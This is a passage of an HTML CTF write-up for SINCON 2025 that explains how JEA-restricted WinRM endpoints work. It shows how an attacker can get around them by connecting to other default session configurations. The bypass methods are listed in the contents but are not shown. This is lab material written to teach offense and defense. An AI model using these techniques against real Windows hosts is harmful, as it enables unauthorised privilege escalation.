@@ -1,0 +1,1189 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>SINCON CTF 2025: Too Much Administration</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="SINCON CTF 2025: Too Much Administration" />
+<meta name="author" content="Zavier Lee" />
+<meta property="og:locale" content="en_US" />
+<link rel="canonical" href="http://localhost:4000/sincon-2025-jea.html" />
+<meta property="og:url" content="http://localhost:4000/sincon-2025-jea.html" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2025-01-01T00:00:00-05:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="SINCON CTF 2025: Too Much Administration" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Zavier Lee"},"dateModified":"2025-01-01T00:00:00-05:00","datePublished":"2025-01-01T00:00:00-05:00","headline":"SINCON CTF 2025: Too Much Administration","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/sincon-2025-jea.html"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/img/logo.png"},"name":"Zavier Lee"},"url":"http://localhost:4000/sincon-2025-jea.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=e4b8990056b4f2f04f83e4faa93e4c6fbb41757d">
+    <!--[if lt IE 9]>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.min.js"></script>
+    <![endif]-->
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+  </head>
+  <body>
+    <div class="wrapper">
+      <header>
+        <h1><a href="http://localhost:4000/"> </a></h1>
+
+        
+          <img src="/assets/img/logo.png" alt="Logo" />
+        
+
+        <p> </p>
+
+        
+        <p class="view"><a href="https://github.com/ASYNC-Security/async-security.github.io">View the Project on GitHub <small>ASYNC-Security/async-security.github.io</small></a></p>
+        
+
+        
+
+        
+      </header>
+      <section>
+
+      <style>
+    .author-section {
+        padding: 14px;
+        margin: 16px 0;
+        background: rgba(255, 255, 255, 0.02);
+        border: 1px solid #444;
+        border-radius: 6px;
+        position: relative;
+    }
+
+    .author-label {
+        position: absolute;
+        top: -8px;
+        left: 12px;
+        background: #1a1a1a;
+        color: #4da6ff;
+        font-size: 0.75em;
+        font-weight: 600;
+        text-transform: uppercase;
+        letter-spacing: 0.5px;
+        padding: 0 6px;
+    }
+
+    .author-info {
+        display: flex;
+        align-items: center;
+        gap: 12px;
+    }
+
+    .author-avatar {
+        width: 40px;
+        height: 40px;
+        border-radius: 50%;
+        object-fit: cover;
+        box-shadow: 0 2px 6px rgba(77, 166, 255, 0.2);
+    }
+
+    .author-details {
+        flex: 1;
+    }
+
+    .author-name {
+        font-weight: 600;
+        color: white;
+        margin: 0 0 2px 0;
+        font-size: 0.95em;
+    }
+
+    .author-title {
+        color: #ccc;
+        font-size: 0.8em;
+        margin: 0 0 6px 0;
+        font-style: italic;
+    }
+
+    .author-links {
+        display: flex;
+        gap: 8px;
+    }
+
+    .social-link {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        width: 28px;
+        height: 28px;
+        background: #333;
+        border-radius: 50%;
+        color: #ccc;
+        text-decoration: none;
+        transition: all 0.3s ease;
+        border: 1px solid #444;
+        font-size: 0.7em;
+    }
+
+    .social-link:hover {
+        color: #fff;
+        transform: translateY(-1px);
+        box-shadow: 0 4px 10px rgba(77, 166, 255, 0.3);
+    }
+
+    .post-meta {
+        color: #ccc;
+        font-size: 0.9em;
+        margin-bottom: 12px;
+    }
+
+    .toc-container {
+        margin: 24px 0;
+        background: rgba(255, 255, 255, 0.02);
+        border: 1px solid #444;
+        border-radius: 6px;
+        overflow: hidden;
+    }
+
+    .toc-toggle {
+        background: none;
+        border: none;
+        font-size: 1em;
+        font-weight: 500;
+        cursor: pointer;
+        width: 100%;
+        text-align: left;
+        padding: 16px;
+        color: #fff;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        transition: background-color 0.2s ease;
+    }
+
+    .toc-toggle:hover {
+        background: rgba(255, 255, 255, 0.05);
+    }
+
+    .toc-toggle::after {
+        content: '▼';
+        color: #999;
+        transition: transform 0.3s ease;
+        font-size: 0.8em;
+    }
+
+    .toc-toggle.expanded::after {
+        transform: rotate(180deg);
+    }
+
+    .toc-content {
+        display: none;
+        padding: 0 16px 16px 16px;
+        border-top: 1px solid #333;
+        background: rgba(0, 0, 0, 0.1);
+    }
+
+    .toc-content.expanded {
+        display: block;
+        animation: slideDown 0.3s ease-out;
+    }
+
+    @keyframes slideDown {
+        from {
+            opacity: 0;
+            transform: translateY(-10px);
+        }
+
+        to {
+            opacity: 1;
+            transform: translateY(0);
+        }
+    }
+
+    .toc-container a {
+        color: #ccc;
+        text-decoration: none;
+        transition: color 0.2s ease;
+    }
+
+    .toc-container a:hover {
+        color: #4da6ff;
+        text-decoration: underline;
+    }
+
+    .toc-container ol {
+        margin: 8px 0 0 0;
+        padding-left: 20px;
+        color: #ccc;
+    }
+
+    .toc-container ul {
+        margin: 4px 0;
+        padding-left: 20px;
+        color: #ccc;
+    }
+
+    .toc-container li {
+        margin: 6px 0;
+        line-height: 1.4;
+    }
+
+    @media (max-width: 962px) {
+        .toc-container {
+            margin: 16px 0;
+        }
+
+        .toc-toggle {
+            padding: 12px;
+            font-size: 0.95em;
+        }
+
+        .toc-content {
+            padding: 0 12px 12px 12px;
+        }
+    }
+
+    @media (max-width: 962px) {
+        .author-section {
+            margin: 16px 0;
+            padding: 16px;
+            border-radius: 6px;
+        }
+
+        .author-label {
+            top: -8px;
+            left: 12px;
+            font-size: 0.8em;
+        }
+
+        .author-info {
+            gap: 12px;
+        }
+
+        .author-avatar {
+            width: 48px;
+            height: 48px;
+            border-width: 2px;
+        }
+
+        .author-name {
+            font-size: 1em;
+        }
+
+        .author-title {
+            font-size: 0.9em;
+        }
+
+        .author-links {
+            gap: 12px;
+            flex-wrap: wrap;
+        }
+
+        .post-meta {
+            margin-bottom: 8px;
+        }
+
+        h1 {
+            margin-top: 0;
+            margin-bottom: 10px;
+        }
+
+        section {
+            padding-top: 0 !important;
+        }
+
+        hr {
+            display: none;
+        }
+    }
+
+    .post-header {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        margin-bottom: 28px;
+        flex-wrap: wrap;
+        gap: 12px;
+    }
+
+    .back-button {
+        display: inline-flex;
+        align-items: center;
+        gap: 6px;
+        padding: 8px 12px;
+        background: rgba(255, 255, 255, 0.05);
+        border: 1px solid #444;
+        border-radius: 20px;
+        color: #ccc;
+        text-decoration: none;
+        font-size: 0.85em;
+        font-weight: 500;
+        transition: all 0.3s ease;
+        width: fit-content;
+        outline: none;
+    }
+
+    .back-button:hover {
+        background: rgba(255, 255, 255, 0.08);
+        color: #4da6ff;
+        border-color: #4da6ff;
+        transform: translateY(-1px);
+        box-shadow: 0 2px 8px rgba(77, 166, 255, 0.2);
+        outline: none;
+    }
+
+    .back-button:focus {
+        outline: none;
+        box-shadow: 0 0 0 2px rgba(77, 166, 255, 0.3);
+    }
+
+    .back-button svg {
+        width: 14px;
+        height: 14px;
+        transition: transform 0.3s ease;
+    }
+
+    .back-button:hover svg {
+        transform: translateX(-2px);
+    }
+
+    .post-meta {
+        color: #999;
+        font-size: 0.85em;
+        padding: 6px 12px;
+        background: rgba(255, 255, 255, 0.03);
+        border: 1px solid rgba(255, 255, 255, 0.08);
+        border-radius: 12px;
+        display: inline-block;
+        font-weight: 500;
+        letter-spacing: 0.3px;
+        margin: 0;
+    }
+
+    @media (max-width: 962px) {
+        .post-header {
+            flex-direction: column;
+            align-items: flex-start;
+            margin-bottom: 24px;
+            gap: 8px;
+        }
+
+        .back-button {
+            margin-top: 12px;
+            padding: 6px 10px;
+            font-size: 0.8em;
+        }
+
+        .back-button svg {
+            width: 12px;
+            height: 12px;
+        }
+
+        .post-meta {
+            font-size: 0.8em;
+            padding: 5px 10px;
+        }
+    }
+</style>
+
+<div class="post-header">
+    <a href="/" class="back-button">
+        <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 16 16">
+            <path fill-rule="evenodd"
+                d="M15 8a.5.5 0 0 0-.5-.5H2.707l3.147-3.146a.5.5 0 1 0-.708-.708l-4 4a.5.5 0 0 0 0 .708l4 4a.5.5 0 0 0 .708-.708L2.707 8.5H14.5A.5.5 0 0 0 15 8z" />
+        </svg>
+        Back
+    </a>
+
+    
+    <small class="post-meta">1 January 2025</small>
+    
+</div>
+
+
+
+
+
+<div class="author-section">
+    <div class="author-label">Author</div>
+    <div class="author-info">
+        
+        <img src="./assets/img/authors/zavier.png" alt="Zavier Lee" class="author-avatar">
+        
+        <div class="author-details">
+            <div class="author-name">Zavier Lee</div>
+            
+            <div class="author-title">Offensive Security Engineer</div>
+            
+            <div class="author-links">
+                
+                <a href="https://x.com/gatariee" target="_blank" class="social-link twitter" aria-label="Twitter">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor"
+                        class="bi bi-twitter-x" viewBox="0 0 16 16">
+                        <path
+                            d="M12.6.75h2.454l-5.36 6.142L16 15.25h-4.937l-3.867-5.07-4.425 5.07H.316l5.733-6.57L0 .75h5.063l3.495 4.633L12.601.75Zm-.86 13.028h1.36L4.323 2.145H2.865z" />
+                    </svg>
+                </a>
+                
+                
+                <a href="https://github.com/gatariee" target="_blank" class="social-link github" aria-label="GitHub">
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
+                        <path
+                            d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z" />
+                    </svg>
+                </a>
+                
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<h1 id="sincon-ctf-2025-too-much-administration">SINCON CTF 2025: Too Much Administration</h1>
+
+<p>This is the second, and final part of the SINCON CTF 2025 writeup series where I covered the more “challenging” parts of the CTF. I highly recommend reading the first part: <a href="https://blog.async.sg/sincon-2025-adcs-relay.html">SINCON 2025: All Too Relayxing</a> as it provides a lot of necessary context for this writeup.</p>
+
+<p>In this writeup, I’ll be covering the solve path for Flag 8 - which involved bypassing <a href="https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/overview?view=powershell-7.5">Just Enough Administration (JEA)</a>. For many participants, this was their first time encountering WinRM endpoints protected by JEA, and you’ll rarely see this in engagements aside from some hardened environments. However, JEA can be a double-edged sword; if not properly configured, it opens up opportunities for abuse and privilege escalation.</p>
+
+<div class="toc-container">
+<button class="toc-toggle" onclick="toggleToc()">Table of Contents</button>
+<div class="toc-content" id="tocContent">
+<ol>
+<li>
+<a href="#introduction-and-scenario">Introduction and Scenario</a>
+</li>
+<li>
+<a href="#enumerating-winrm">Enumerating WinRM</a>
+<ul>
+<li><a href="#failed-command-execution">Failed Command Execution</a></li>
+</ul>
+</li>
+<li>
+<a href="#jea-a-tldr">JEA, a TLDR</a>
+<ul>
+<li><a href="#role-capabilities">Role Capabilities</a></li>
+<li><a href="#registration-configuration">Registration Configuration</a></li>
+<li><a href="#runasvirtualaccount">RunAsVirtualAccount</a></li>
+<li><a href="#configurationname">ConfigurationName</a></li>
+<li><a href="#overwriting-defaults">Overwriting Defaults</a></li>
+</ul>
+</li>
+<li>
+<a href="#connecting-to-jea">Connecting to JEA</a>
+<ul>
+<li><a href="#understanding-the-errors">Understanding the Errors</a></li>
+<li><a href="#using-pypsrp-directly">Using pypsrp Directly</a></li>
+<li><a href="#publicly-available-tools">Publicly Available Tools</a></li>
+</ul>
+</li>
+<li>
+<a href="#bypassing-jea">Bypassing JEA</a>
+<ul>
+<li><a href="#method-1-reverse-shell">Method 1: Reverse Shell</a></li>
+<li><a href="#method-2-ntlm-relay-to-ldap-via-http">Method 2: NTLM Relay to LDAP via HTTP</a>
+<ul>
+<li><a href="#reverse-port-forwarding">Reverse Port Forwarding</a></li>
+<li><a href="#creating-a-machine-account">Creating a Machine Account</a></li>
+<li><a href="#starting-relay-listener">Starting Relay Listener</a></li>
+<li><a href="#sending-http-authentication">Sending HTTP Authentication</a></li>
+<li><a href="#receiving-the-relay">Receiving the Relay</a></li>
+<li><a href="#resource-based-constrained-delegation">Resource-Based Constrained Delegation</a></li>
+</ul>
+</li>
+<li><a href="#method-3-smb-relay-to-esc8">Method 3: SMB Relay to ESC8</a>
+<ul>
+<li><a href="#sending-smb-authentication">Sending SMB Authentication</a></li>
+<li><a href="#relaying-to-esc8">Relaying to ESC8</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<a href="#configurationname-pitfalls">ConfigurationName Pitfalls</a>
+</li>
+<li>
+<a href="#mitigations--detections">Mitigations &amp; Detections</a>
+<ul>
+<li><a href="#regularly-review-role-capabilities">Regularly Review Role Capabilities</a></li>
+<li><a href="#monitoring-virtual-accounts">Monitoring Virtual Accounts</a></li>
+<li><a href="#auditing">Auditing</a></li>
+</ul>
+</li>
+<li>
+<a href="#conclusion">Conclusion</a>
+</li>
+</ol>
+</div>
+</div>
+
+<h2 id="introduction-and-scenario">Introduction and Scenario</h2>
+
+<p><img src="/assets/img/sincon-2/scenario.jpg" alt="" /></p>
+
+<p>The current scenario is explained in more depth in the first part of the writeup, but to summarize, we have compromised <code class="language-plaintext highlighter-rouge">TABULARIUM</code> and <code class="language-plaintext highlighter-rouge">SCRIPTORIUM</code>. Additionally, we have access to a <code class="language-plaintext highlighter-rouge">JESS\Doros_ARCHIVON</code> user from a previous attack path. The next target is <code class="language-plaintext highlighter-rouge">PORTICUS</code>, which is also a <code class="language-plaintext highlighter-rouge">Windows Server 2022</code> machine.</p>
+
+<p>Additionally, a reverse port forward has been established on <code class="language-plaintext highlighter-rouge">TABULARIUM</code> on Port 445 to redirect all traffic to my machine on Port 445.</p>
+
+<h2 id="enumerating-winrm">Enumerating WinRM</h2>
+
+<p>Using the <code class="language-plaintext highlighter-rouge">JESS\Doros_ARCHIVON</code> user, we can identify that we have access to the WinRM service on <code class="language-plaintext highlighter-rouge">PORTICUS</code>.</p>
+
+<p><img src="/assets/img/sincon-2/99d0d121ca7824ee368ee159133be63e.png" alt="" /></p>
+
+<h3 id="failed-command-execution">Failed Command Execution</h3>
+
+<p>However, attempting to use the <code class="language-plaintext highlighter-rouge">-x</code> option with <code class="language-plaintext highlighter-rouge">nxc</code> shows that no output is retrieved by the command.</p>
+
+<p><img src="/assets/img/sincon-2/aa78ab2ce2d6b9ab2e6d255e8f57a276.png" alt="" /></p>
+
+<p>Running the same command with <code class="language-plaintext highlighter-rouge">--debug</code> shows that the internal executor is throwing an error that <code class="language-plaintext highlighter-rouge">Invoke-Expression</code> is not found as an available commandlet.</p>
+
+<p><img src="/assets/img/sincon-2/24808f1980a23763dde687a7cb838e49.png" alt="" /></p>
+
+<p>Similarly, attempting to connect to the WinRM service using <code class="language-plaintext highlighter-rouge">evil-winrm</code> results in the same error:</p>
+
+<p><img src="/assets/img/sincon-2/2a022b19db8bbdacdd2e3edda37a30e3.png" alt="" /></p>
+
+<p>These errors are occurring because the WinRM service on <code class="language-plaintext highlighter-rouge">PORTICUS</code> is configured with <a href="https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/overview?view=powershell-7.5">Just Enough Administration (JEA)</a>, which restricts the available commands and modules that can be executed by the user.</p>
+
+<h2 id="jea-a-tldr">JEA, a TLDR</h2>
+
+<p><a href="https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/overview?view=powershell-7.5">Just Enough Administration (JEA)</a> is a hardening mechanism in Windows that allows administrators to delegate specific administrative tasks to users without granting them full administrative privileges. It does this by restricting the available commands and modules that can be executed by the user, effectively creating a limited PowerShell environment.</p>
+
+<p>You can view the full documentation <a href="https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/overview?view=powershell-7.5">here</a>, and I strongly recommend reading it to understand how JEA works.</p>
+
+<p>According to the documentation, JEA is designed to:</p>
+<ol>
+  <li>Reduce the number of administrators on your machines</li>
+  <li>Limit what users run on your machines</li>
+  <li>Better understand what your users are doing on your machines</li>
+</ol>
+
+<p>If you’re more familiar with Linux, JEA is similar to the concept of <code class="language-plaintext highlighter-rouge">sudo</code> with restricted commands, where users can only execute specific commands as a privileged user.</p>
+
+<h3 id="role-capabilities">Role Capabilities</h3>
+
+<p>In JEA sessions, the available commands and modules are defined in a “role capability” file, which is a PowerShell module that specifies the commands and modules that are available to the user. Role capability files are typically stored in the <code class="language-plaintext highlighter-rouge">C:\Program Files\WindowsPowerShell\&lt;ROLE&gt;\RoleCapabilities</code> directory, where <code class="language-plaintext highlighter-rouge">&lt;ROLE&gt;</code> is the name of the role.</p>
+
+<p>This file defines the commands and modules that are available to the user, as well as any parameters that can be used with those commands. The following example allows the user to execute only the <code class="language-plaintext highlighter-rouge">Restart-Computer</code> and <code class="language-plaintext highlighter-rouge">Get-NetIPAddress</code> commandlets, these are lifted directly off the documentation:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">VisibleCmdlets</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">@(</span><span class="s1">'Restart-Computer'</span><span class="p">,</span><span class="w"> </span><span class="s1">'Get-NetIPAddress'</span><span class="p">)</span><span class="w">
+</span></code></pre></div></div>
+
+<p>The capability file can also have more fine-grained control over the parameters that can be used with each command.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">VisibleCmdlets</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">@{</span><span class="w">
+    </span><span class="nx">Name</span><span class="w">       </span><span class="o">=</span><span class="w"> </span><span class="s1">'Restart-Computer'</span><span class="w">
+    </span><span class="nx">Parameters</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">@{</span><span class="w"> </span><span class="nx">Name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'Name'</span><span class="w"> </span><span class="p">}</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p>And, additionally supports those pesky argument wildcards that <code class="language-plaintext highlighter-rouge">sudo</code> also supports:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">VisibleCmdlets</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">@(</span><span class="w">
+    </span><span class="p">@{</span><span class="w">
+        </span><span class="nx">Name</span><span class="w">       </span><span class="o">=</span><span class="w"> </span><span class="s1">'Restart-Service'</span><span class="w">
+        </span><span class="nx">Parameters</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">@{</span><span class="w"> </span><span class="nx">Name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'Name'</span><span class="p">;</span><span class="w"> </span><span class="nx">ValidateSet</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">@(</span><span class="s1">'Dns'</span><span class="p">,</span><span class="w"> </span><span class="s1">'Spooler'</span><span class="p">)</span><span class="w"> </span><span class="p">}</span><span class="w">
+    </span><span class="p">}</span><span class="w">
+    </span><span class="p">@{</span><span class="w">
+        </span><span class="nx">Name</span><span class="w">       </span><span class="o">=</span><span class="w"> </span><span class="s1">'Start-Website'</span><span class="w">
+        </span><span class="nx">Parameters</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">@{</span><span class="w"> </span><span class="nx">Name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'Name'</span><span class="p">;</span><span class="w"> </span><span class="nx">ValidatePattern</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'HR_*'</span><span class="w"> </span><span class="p">}</span><span class="w">
+    </span><span class="p">}</span><span class="w">
+</span><span class="p">)</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="registration-configuration">Registration Configuration</h3>
+
+<p>Using the above defined role capabilities, you can create configuration files (that can be applied to <code class="language-plaintext highlighter-rouge">Session Configurations</code>). An example of how you could create a configuration file for a role located in <code class="language-plaintext highlighter-rouge">C:\Program Files\WindowsPowerShell\Modules\JEA_Test_Module\RoleCapabilities</code> may look like this:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">New-PSSessionConfigurationFile</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="s2">"C:\JEA\Configuration.pssc"</span><span class="w"> </span><span class="se">`
+</span><span class="w">    </span><span class="nt">-SessionType</span><span class="w"> </span><span class="nx">RestrictedRemoteServer</span><span class="w"> </span><span class="se">`
+</span><span class="w">    </span><span class="nt">-RunAsVirtualAccount</span><span class="w"> </span><span class="se">`
+</span><span class="w">    </span><span class="nt">-RoleDefinitions</span><span class="w"> </span><span class="p">@{</span><span class="w">
+        </span><span class="s1">'DOMAIN\Restricted Administrators'</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">@{</span><span class="w"> </span><span class="nx">RoleCapabilities</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">@(</span><span class="s1">'JEA_Test_Module'</span><span class="p">)</span><span class="w"> </span><span class="p">}</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p>This configuration file can be used with the <code class="language-plaintext highlighter-rouge">Register-PSSessionConfiguration</code> cmdlet to register a new session configuration that uses the specified role capabilities.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Register-PSSessionConfiguration</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="s2">"Test_JEA"</span><span class="w"> </span><span class="se">`
+</span><span class="w">    </span><span class="nt">-Path</span><span class="w"> </span><span class="s2">"C:\JEA\Configuration.pssc"</span><span class="w"> </span><span class="se">`
+</span></code></pre></div></div>
+
+<p>Subsequently, users part of the <code class="language-plaintext highlighter-rouge">DOMAIN\Restricted Administrators</code> group can connect to the JEA session using the <code class="language-plaintext highlighter-rouge">-ConfigurationName</code> parameter and execute commands defined in the role capabilities as an Administrator.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Enter-PSSession</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="s2">"PORTICUS"</span><span class="w"> </span><span class="nt">-ConfigurationName</span><span class="w"> </span><span class="s2">"Test_JEA"</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="runasvirtualaccount">RunAsVirtualAccount</h3>
+
+<p>The <code class="language-plaintext highlighter-rouge">-RunAsVirtualAccount</code> parameter in <code class="language-plaintext highlighter-rouge">New-PSSessionConfigurationFile</code> creates a virtual account that is used to run the JEA session. This virtual account is a local account that is created on the machine where the JEA session is running, this means that any remotely connected user will essentially have restricted local administrator privileges on the machine.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">New-PSSessionConfigurationFile</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="s2">"C:\JEA\Configuration.pssc"</span><span class="w"> </span><span class="se">`
+</span><span class="w">    </span><span class="nt">-SessionType</span><span class="w"> </span><span class="nx">RestrictedRemoteServer</span><span class="w"> </span><span class="se">`
+</span><span class="w">    </span><span class="nt">-RunAsVirtualAccount</span><span class="w"> </span><span class="se">`
+</span><span class="w">    </span><span class="nt">-RoleDefinitions</span><span class="w"> </span><span class="p">@{</span><span class="w">
+        </span><span class="s1">'DOMAIN\Restricted Administrators'</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">@{</span><span class="w"> </span><span class="nx">RoleCapabilities</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">@(</span><span class="s1">'JEA_Test_Module'</span><span class="p">)</span><span class="w"> </span><span class="p">}</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p>This flag can be omitted to run the JEA session as a specific user, but in most cases if you are considering JEA - you are probably using it specifically for this functionality.</p>
+
+<h3 id="configurationname">ConfigurationName</h3>
+
+<p>In Windows, there are 4 default PowerShell session configurations that are registered by default:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\&gt; Get-PSSessionConfiguration | ForEach-Object { $_.Name }
+Microsoft.PowerShell
+microsoft.powershell.workflow
+microsoft.powershell32
+microsoft.windows.servermanagerworkflows
+</code></pre></div></div>
+
+<p>The default configuration used is <code class="language-plaintext highlighter-rouge">Microsoft.PowerShell</code>, which is the standard PowerShell session configuration. This can be seen when you run the <code class="language-plaintext highlighter-rouge">Enter-PSSession</code> command without specifying a configuration name:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\&gt; Enter-PSSession -ComputerName "localhost"
+[localhost]: PS C:\&gt; $PSSenderInfo.ConfigurationName
+Microsoft.PowerShell
+</code></pre></div></div>
+
+<p>You can connect to endpoints using alternative session configurations by specifying the <code class="language-plaintext highlighter-rouge">-ConfigurationName</code> parameter in the <code class="language-plaintext highlighter-rouge">Enter-PSSession</code> command. For example, the <code class="language-plaintext highlighter-rouge">microsoft.powershell32</code> configuration can be used to connect to a 32-bit PowerShell session:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\&gt; Enter-PSSession -ComputerName "localhost" -ConfigurationName "microsoft.powershell32"
+[localhost]: PS C:\&gt; $PSSenderInfo.ConfigurationName
+microsoft.powershell32
+</code></pre></div></div>
+
+<p>Similarly, if there is a custom session configuration registered (such as with JEA), you can connect to it by specifying the configuration name. However, attempting to run <code class="language-plaintext highlighter-rouge">$PSSenderInfo.ConfigurationName</code> will fail if the session configuration does not support it, as seen in the previous examples with JEA.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\&gt; Enter-PSSession -ComputerName "localhost" -ConfigurationName "Test_JEA"
+[localhost]: PS C:\&gt; $PSSenderInfo.ConfigurationName
+The term '$PSSenderInfo.ConfigurationName' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+</code></pre></div></div>
+
+<p>The following commandlets are enabled by default, regardless of the session configuration.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[localhost]: PS&gt; Get-Command
+
+CommandType     Name                                               Version    Source
+-----------     ----                                               -------    ------
+Function        Clear-Host
+Function        Exit-PSSession
+Function        Get-Command
+Function        Get-FormatData
+Function        Get-Help
+Function        Measure-Object
+Function        Out-Default
+Function        Select-Object
+</code></pre></div></div>
+
+<h3 id="overwriting-defaults">Overwriting Defaults</h3>
+
+<p>In some situations, you may choose to overwrite the default <code class="language-plaintext highlighter-rouge">microsoft.powershell</code> configuration with your own custom configuration. This can be done by using the <code class="language-plaintext highlighter-rouge">-Force</code> parameter when registering the session configuration:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Register-PSSessionConfiguration -Name Microsoft.PowerShell -Path "C:\JEA\Configuration.pssc" -Force
+</code></pre></div></div>
+
+<p>After doing so, you will be able to connect to the WinRM endpoint without specifying a custom <code class="language-plaintext highlighter-rouge">-ConfigurationName</code>, as it will now use your custom configuration by default.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\Windows\system32&gt; Enter-PSSession -ComputerName localhost
+[localhost]: PS&gt;Get-Command
+
+CommandType     Name                                               Version    Source
+-----------     ----                                               -------    ------
+Function        Clear-Host
+Function        Exit-PSSession
+Function        Get-Command
+Function        Get-FormatData
+Function        Get-Help
+Function        Measure-Object
+Function        Out-Default
+Function        Select-Object
+</code></pre></div></div>
+
+<p>However, it is important to note that if you decide that overwriting the default configuration is your only option. You will also need to replace the other default configurations, such as <code class="language-plaintext highlighter-rouge">microsoft.powershell.workflow</code>, <code class="language-plaintext highlighter-rouge">microsoft.powershell32</code>, and <code class="language-plaintext highlighter-rouge">microsoft.windows.servermanagerworkflows</code>, as attackers can simply connect to these configurations instead and maintain full access to the system.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\&gt; Enter-PSSession -ComputerName "localhost" -ConfigurationName "microsoft.powershell32"
+[localhost]: PS C:\&gt; Get-Command
+
+CommandType     Name                                               Version    Source
+-----------     ----                                               -------    ------
+Alias           Add-AppPackage                                     2.0.1.0    Appx
+Alias           Add-AppPackageVolume                               2.0.1.0    Appx
+Alias           Add-AppProvisionedPackage                          3.0        Dism
